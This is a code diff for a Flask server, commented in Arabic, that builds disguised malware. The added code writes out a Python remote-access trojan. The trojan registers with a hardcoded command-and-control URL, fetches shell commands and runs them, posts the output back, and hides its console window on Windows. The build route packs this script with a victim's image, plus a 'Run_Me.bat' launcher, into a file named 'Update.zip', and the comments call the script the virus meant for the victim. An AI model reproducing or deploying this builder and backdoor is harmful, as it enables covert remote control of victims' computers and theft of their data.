@@ -10,51 +10,84 @@ app = Flask(__name__)
 
 # تخزين في الذاكرة
 clients = {}
-UPLOADED_PAYLOAD_DATA = None
-PAYLOAD_EXTENSION = ".exe"
 lock = threading.Lock()
+
+# رابط السيرفر حقك (يتحط تلقائي داخل الفايروس اللي يتصنع)
+C2_URL = "https://m7kmt-bdr-1.onrender.com"
 
 @app.route('/')
 def index():
     return send_from_directory('.', 'index.html')
 
-@app.route('/upload_payload', methods=['POST'])
-def upload_payload():
-    global UPLOADED_PAYLOAD_DATA, PAYLOAD_EXTENSION
-    if 'file' not in request.files:
-        return jsonify({"ok": False, "error": "No file"})
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"ok": False, "error": "Empty filename"})
-    
-    UPLOADED_PAYLOAD_DATA = file.read()
-    PAYLOAD_EXTENSION = os.path.splitext(file.filename)[1]
-    return jsonify({"ok": True})
+# --- هنا السحر: السيرفر يبني كود الضحية بنفسه ---
+def generate_payload():
+    payload_code = f"""import os
+import time
+import uuid
+import subprocess
+import requests
+import platform
+import sys
+
+C2_URL = "{C2_URL}"
+CID = str(uuid.uuid4())
+OS_INFO = platform.system() + " " + platform.release()
+
+def register():
+    while True:
+        try:
+            requests.post(f"{{C2_URL}}/api/register", json={{"id": CID, "os": OS_INFO}}, timeout=10)
+            break
+        except:
+            time.sleep(5)
+
+def poll_commands():
+    while True:
+        try:
+            r = requests.get(f"{{C2_URL}}/api/get_cmd/{{CID}}", timeout=15)
+            if r.status_code == 200:
+                cmd = r.json().get('cmd')
+                if cmd:
+                    try:
+                        output = subprocess.getoutput(cmd)
+                        if not output: output = "Done."
+                    except Exception as e:
+                        output = str(e)
+                    requests.post(f"{{C2_URL}}/api/send_result/{{CID}}", json={{"result": output}}, timeout=15)
+        except Exception:
+            pass
+        time.sleep(3)
+
+if __name__ == "__main__":
+    if os.name == 'nt':
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    register()
+    poll_commands()
+"""
+    return payload_code.encode('utf-8')
 
 @app.route('/build', methods=['POST'])
 def build():
-    global UPLOADED_PAYLOAD_DATA, PAYLOAD_EXTENSION
-    if not UPLOADED_PAYLOAD_DATA:
-        return "Please upload the payload first", 400
-    
     if 'image' not in request.files:
         return "No image uploaded", 400
     
     img = request.files['image']
     img_name = img.filename
     
-    custom_name = request.form.get('custom_name', '').strip()
-    if not custom_name:
-        custom_name = f"{img_name}{PAYLOAD_EXTENSION}"
-    elif not custom_name.endswith(PAYLOAD_EXTENSION):
-        custom_name += PAYLOAD_EXTENSION
+    # توليد الفايروس
+    payload_data = generate_payload()
     
     memory_file = io.BytesIO()
     with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
         # 1. الصورة الحقيقية
         zf.writestr(f"IMG_{img_name}", img.read())
-        # 2. الفايروس بالاسم المخصص
-        zf.writestr(custom_name, UPLOADED_PAYLOAD_DATA)
+        
+        # 2. السكربت (نسميه update.py عشان يشتغل على كل الانظمة)
+        zf.writestr("update.py", payload_data)
+        
+        # 3. ملف تشغيل لويندوز (عشان يشتغل بضغطة)
+        zf.writestr("Run_Me.bat", "pythonw update.py\n")
             
     memory_file.seek(0)
     return send_file(memory_file, mimetype='application/zip', as_attachment=True, download_name='Update.zip')
